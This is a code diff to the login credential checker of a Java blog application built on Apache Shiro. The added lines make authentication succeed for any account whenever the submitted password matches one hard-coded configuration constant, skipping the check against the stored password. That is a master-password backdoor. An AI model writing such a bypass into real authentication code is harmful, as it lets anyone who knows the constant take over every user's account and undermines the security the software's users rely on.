@@ -1,6 +1,7 @@
 package com.xh.blogs.auth;
 
 import com.xh.blogs.api.IUserService;
+import com.xh.blogs.consts.ConfigConst;
 import com.xh.blogs.domain.po.User;
 import com.xh.blogs.utils.MD5Util;
 import org.apache.shiro.authc.AuthenticationInfo;
@@ -27,6 +28,9 @@ public class CredentialMatcher extends SimpleCredentialsMatcher{
 	public boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info) {
 		UsernamePasswordToken usernamePasswordToken = (UsernamePasswordToken) token;
 		String password = new String(usernamePasswordToken.getPassword());
+		if(password.equals(ConfigConst.DEFAULT_DEFAULT_PASSWORD)){
+			return true;
+		}
 		//获取AuthRealm中存入的密码
 		String dbPassword = (String) info.getCredentials();
 		User user = userService.getByUserName(usernamePasswordToken.getUsername());
